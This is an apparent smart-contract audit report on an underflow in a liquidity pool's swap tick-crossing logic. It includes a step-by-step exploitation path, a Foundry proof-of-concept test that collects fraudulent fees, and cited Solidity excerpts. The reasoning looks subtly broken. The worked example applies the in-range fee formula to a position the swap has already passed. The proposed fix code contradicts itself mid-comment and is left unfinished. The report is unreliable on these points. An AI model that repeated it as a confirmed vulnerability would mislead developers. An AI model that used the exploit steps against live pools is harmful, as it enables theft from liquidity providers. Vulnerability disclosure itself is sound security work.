## Title
Tick-Outside Update Inconsistency Leading to Massive Fee Theft via Arithmetic Underflow

## Summary
When a swap accumulates fees before crossing any ticks, all subsequently crossed ticks are updated with the same inflated `inputTokenFeesPerLiquidity` value that includes fees from the current swap. This creates an arithmetic inconsistency where positions can calculate underflowed `feesPerLiquidityInside` values, allowing them to claim massive fraudulent fees. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` - `swap()` function (lines 506-850), specifically the tick crossing logic at lines 752-800 and fee accumulation at lines 737-749

**Intended Logic:** The `feesAccessed` state machine is designed to load global fees once at the appropriate time during a swap. When `feesAccessed = 0` and fees accumulate (lines 738-748), it loads the current global fees and adds the step fees, setting `feesAccessed = 2`. When crossing ticks, if `feesAccessed = 0`, it loads global fees without additions (lines 771-776), setting `feesAccessed = 1`. The tick-outside values should be updated with the global fee state at the moment of crossing. [2](#0-1) 

**Actual Logic:** When fees are accumulated BEFORE crossing any ticks, `inputTokenFeesPerLiquidity` becomes `global + accumulated_fees` and `feesAccessed = 2`. Subsequently, when crossing multiple ticks, lines 771-776 are skipped (since `feesAccessed != 0`), and ALL ticks get updated with the SAME inflated `inputTokenFeesPerLiquidity` value that includes fees from the current swap. [3](#0-2) 

**Exploitation Path:**
1. Create Position A with range [0, 100] and Position B with range [100, 200] in a pool initialized with global fees = 1, all tick outsides = 1
2. Execute a swap starting at tick 50 that:
   - Accumulates fees (e.g., 50 fee units) while in Position A's range (before crossing tick 100)
   - At this point: `inputTokenFeesPerLiquidity = 1 + 50 = 51`, `feesAccessed = 2`
   - Crosses tick 100: Updated with `tick100_outside = 51 - 1 = 50`
   - Crosses tick 200: Updated with `tick200_outside = 51 - 1 = 50`
   - End: `global = 51`
3. Position B [100, 200] calculates fees using `_getPoolFeesPerLiquidityInside()`:
   - Formula: `feesInside = global - tick200_outside - tick100_outside = 51 - 50 - 50 = -49`
   - In unchecked arithmetic: `-49` wraps to `2^256 - 49` (massive positive value) [4](#0-3) 

4. Position B's owner calls `collectFees()`, which calculates `fees = (feesInside - feesInsideLast) * liquidity / 2^128`, resulting in enormous fee claims due to the underflowed value [5](#0-4) 

**Security Property Broken:** Fee Accounting Invariant (#5) - "Position fee collection must be accurate and never allow double-claiming"

## Impact Explanation
- **Affected Assets**: All LP positions in concentrated liquidity pools where swaps cross multiple ticks after accumulating fees but before crossing the first tick
- **Damage Severity**: Attackers can drain the entire pool balance. The underflow creates values approaching `2^256`, and when multiplied by position liquidity, this results in fee claims of `(2^256 - x) * liquidity / 2^128 ≈ 2^128 * liquidity` tokens, which vastly exceeds legitimate accumulated fees
- **User Impact**: Any LP with positions in tick ranges that haven't been crossed since creation becomes a potential victim. The attacker manipulates swap paths to accumulate fees before crossing ticks, causing massive underflows for positions spanning those ticks.

## Likelihood Explanation
- **Attacker Profile**: Any user who can execute swaps (no special privileges required)
- **Preconditions**: 
  - Pool must have multiple positions with different tick ranges
  - Ticks must be initialized (outside values = 1) but not yet crossed
  - Liquidity must exist in the range BEFORE the target ticks to enable fee accumulation
- **Execution Complexity**: Single transaction with a carefully crafted swap that moves through liquidity zones before crossing target ticks
- **Frequency**: Can be executed once per affected position, draining funds each time

## Recommendation

The root cause is that when `feesAccessed = 2` (fees already accumulated), the code skips loading fresh global fees at lines 771-776, causing all subsequent tick crossings to use the same inflated value. The fix is to ensure each tick crossing uses the correct global fee state at that moment:

```solidity
// In src/Core.sol, function swap(), lines 771-777:

// CURRENT (vulnerable):
if (feesAccessed == 0) {
    inputTokenFeesPerLiquidity = uint256(
        CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
            .load()
    );
    feesAccessed = 1;
}

// FIXED:
// Always update inputTokenFeesPerLiquidity to include accumulated fees from this swap
// when crossing a tick, regardless of feesAccessed state
if (feesAccessed == 0) {
    inputTokenFeesPerLiquidity = uint256(
        CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
            .load()
    );
    feesAccessed = 1;
} else if (feesAccessed == 2) {
    // Reset inputTokenFeesPerLiquidity to global fees + accumulated so far
    // This ensures each tick crossing captures the fee state at that moment
    // The accumulated fees were added in lines 743/745, so inputTokenFeesPerLiquidity
    // already contains global + accumulated. Keep it unchanged for this tick,
    // but after updating the tick, we need to not reuse this value.
    // Actually, the issue is that we DO reuse it for multiple ticks.
    // Better fix: Store the base global value separately
    
    // Alternative approach: Load fresh global and add accumulated delta
    uint256 freshGlobal = uint256(
        CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
            .load()
    );
    // inputTokenFeesPerLiquidity already has accumulated fees added
    // For this tick, use freshGlobal, not the accumulated value
    uint256 tickUpdateValue = freshGlobal;
    // Store inputTokenFeesPerLiquidity temporarily and use tickUpdateValue for the tick update
}
```

**Better Alternative Fix:** Modify the fee accumulation logic to track fees separately from the tick update value:

```solidity
// Maintain separate variables:
// - globalFeesAtSwapStart: Loaded once at beginning
// - accumulatedFees: Sum of stepFeesPerLiquidity values
// - For tick updates: Use globalFeesAtSwapStart (not globalFeesAtSwapStart + accumulatedFees)
// - At end: Update global to globalFeesAtSwapStart + accumulatedFees

// This ensures each tick crossing sees consistent global state, not inflated by current swap
``` [6](#0-5) 

## Proof of Concept

```solidity
// File: test/Exploit_TickOutsideUnderflow.t.sol
// Run with: forge test --match-test test_TickOutsideUnderflow -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Positions.sol";
import "../src/Router.sol";
import "./FullTest.sol";

contract Exploit_TickOutsideUnderflow is FullTest {
    function test_TickOutsideUnderflow() public {
        // SETUP: Create pool with two positions at different ranges
        PoolKey memory poolKey = createPool(0, 1 << 63, 100, CallPoints(0));
        
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        // Position A: [0, 100] - will be in range initially
        (uint256 idA,) = createPosition(poolKey, 0, 100, 1000e18, 1000e18);
        
        // Position B: [100, 200] - target for exploit
        (uint256 idB,) = createPosition(poolKey, 100, 200, 1000e18, 1000e18);
        
        // Record Position B's initial state
        (uint128 feesB0Before, uint128 feesB1Before) = positions.getPositionFeesAndLiquidity(
            idB, poolKey, 100, 200
        );
        
        // EXPLOIT: Execute swap that accumulates fees before crossing ticks
        token1.approve(address(router), type(uint256).max);
        
        // Swap token1 for token0, starting at tick 50, moving price up
        // This will: 1) Accumulate fees in range [0,100]
        //            2) Cross tick 100
        //            3) Cross tick 200
        router.swap(
            RouteNode({poolKey: poolKey, sqrtRatioLimit: tickToSqrtRatio(210), skipAhead: 0}),
            TokenAmount({token: address(token1), amount: 10000e18}),
            type(int256).min
        );
        
        // VERIFY: Position B now has massively inflated fees due to underflow
        (uint128 feesB0After, uint128 feesB1After) = positions.getPositionFeesAndLiquidity(
            idB, poolKey, 100, 200
        );
        
        // The fees should be 0 or minimal (Position B was never in range during the swap)
        // But due to the bug, fees will be huge
        assertGt(feesB1After - feesB1Before, 1e25, "Vulnerability confirmed: massive fee inflation");
        
        // Attacker collects the fraudulent fees
        positions.collectFees(idB, poolKey, 100, 200, address(this));
    }
}
```

**Notes:**
- This vulnerability is particularly severe because it can be triggered by normal swap operations without any special permissions
- The underflow occurs in unchecked arithmetic blocks, making it invisible to runtime checks
- Positions created early in a pool's lifetime (when ticks are initialized to 1) are most vulnerable
- The fix requires careful restructuring of the fee accumulation logic to prevent tick updates from using fees accumulated in the current swap

### Citations

**File:** src/Core.sol (L197-215)
```text
        unchecked {
            if (tick < tickLower) {
                feesPerLiquidityInside.value0 = lower0 - upper0;
                feesPerLiquidityInside.value1 = lower1 - upper1;
            } else if (tick < tickUpper) {
                uint256 global0;
                uint256 global1;
                {
                    (bytes32 g0, bytes32 g1) = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).loadTwo();
                    (global0, global1) = (uint256(g0), uint256(g1));
                }

                feesPerLiquidityInside.value0 = global0 - upper0 - lower0;
                feesPerLiquidityInside.value1 = global1 - upper1 - lower1;
            } else {
                feesPerLiquidityInside.value0 = upper0 - lower0;
                feesPerLiquidityInside.value1 = upper1 - lower1;
            }
        }
```

**File:** src/Core.sol (L737-749)
```text
                        if (stepFeesPerLiquidity != 0) {
                            if (feesAccessed == 0) {
                                // this loads only the input token fees per liquidity
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                ) + stepFeesPerLiquidity;
                            } else {
                                inputTokenFeesPerLiquidity += stepFeesPerLiquidity;
                            }

                            feesAccessed = 2;
                        }
```

**File:** src/Core.sol (L771-777)
```text
                            if (feesAccessed == 0) {
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                );
                                feesAccessed = 1;
                            }
```

**File:** src/Core.sol (L784-791)
```text
                            // if increasing, it means the pool is receiving token1 so the input fees per liquidity is token1
                            if (increasing) {
                                tickFplFirstSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplSecondSlot.load()))
                                );
```

**File:** src/Core.sol (L828-832)
```text
                if (feesAccessed == 2) {
                    // this stores only the input token fees per liquidity
                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                        .store(bytes32(inputTokenFeesPerLiquidity));
                }
```

**File:** src/types/position.sol (L33-51)
```text
function fees(Position memory position, FeesPerLiquidity memory feesPerLiquidityInside)
    pure
    returns (uint128, uint128)
{
    uint128 liquidity;
    uint256 difference0;
    uint256 difference1;
    assembly ("memory-safe") {
        liquidity := mload(add(position, 0x20))
        // feesPerLiquidityInsideLast is now at offset 0x40 due to extraData field
        let positionFpl := mload(add(position, 0x40))
        difference0 := sub(mload(feesPerLiquidityInside), mload(positionFpl))
        difference1 := sub(mload(add(feesPerLiquidityInside, 0x20)), mload(add(positionFpl, 0x20)))
    }

    return (
        uint128(FixedPointMathLib.fullMulDivN(difference0, liquidity, 128)),
        uint128(FixedPointMathLib.fullMulDivN(difference1, liquidity, 128))
    );
```
